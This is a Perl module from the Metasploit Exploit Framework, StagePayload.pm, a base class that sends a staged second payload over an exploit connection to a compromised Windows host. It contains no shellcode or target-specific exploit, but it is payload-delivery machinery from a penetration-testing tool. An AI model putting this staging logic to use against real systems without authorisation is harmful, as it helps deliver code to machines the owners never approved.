###############
##
#
#    Name: StagePayload.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Base class for stager payload components that handles
#      the transmission of the stage payload.
#
##
###############

package Msf::PayloadComponent::Windows::StagePayload;
use strict;
use vars qw{@ISA};

#
# Import dependencies
#
sub _Import 
{
	my $class = shift;

	@ISA = ();

	foreach (@_) 
	{
		eval("use $_");
		unshift(@ISA, $_);
	}
}

#
# Returns the stage payload attribute of the information that was passed in
#
sub StagePayload 
{
	my $self = shift;

	return $self->_Info->{'StagePayload'};
}

#
# The prefix for the stage.  This is how tags are prefixed to the stage.
#
sub StagePrefix
{
	my $self = shift;
	my $prefix = @_ ? shift : undef;

	$self->{'_StagePrefix'} = $prefix if (defined($prefix));

	return $self->{'_StagePrefix'};
}

sub InlineStage
{
	my $self = shift;
	my $inline = @_ ? shift : undef;

	$self->{'_StageInline'} = $inline if (defined($inline));

	return $self->{'_StageInline'};
}

#
# Transmits the stage that we were handed such that it will be executed and
# all the lored's people will be happy
#
sub HandleConnection 
{
	my $self = shift;
	my $blocking;
	my $payload;
	my $sock;

	# Prepare yoself!
	$self->SUPER::HandleConnection;

	# If the multistage is transmitted outside of this context, do not transmit
	# it.  This was added in order to support things that have to transmit the
	# second stage out of band instead of over the actual exploit connection,
	# like PassiveX.
	return if ($self->InlineStage());

	# Build out the stage
	$sock     = $self->PipeRemoteOut;
	$payload  = $self->BuildPayload($self->StagePayload);
	$blocking = $sock->blocking;

	$sock->blocking(1);

	# If the stage has a prefix (such as a tag) use it.
	$payload = $self->StagePrefix . $payload if (defined($self->StagePrefix));

	# Transmit the stage to the remote side
	$self->PrintLine('[*] Sending Stage (' . length($payload) . ' bytes)');

	eval { $sock->send($payload); };

	$self->PrintDebugLine(3, '[*] Stage Sent.');

	$sock->blocking($blocking);
}

1;
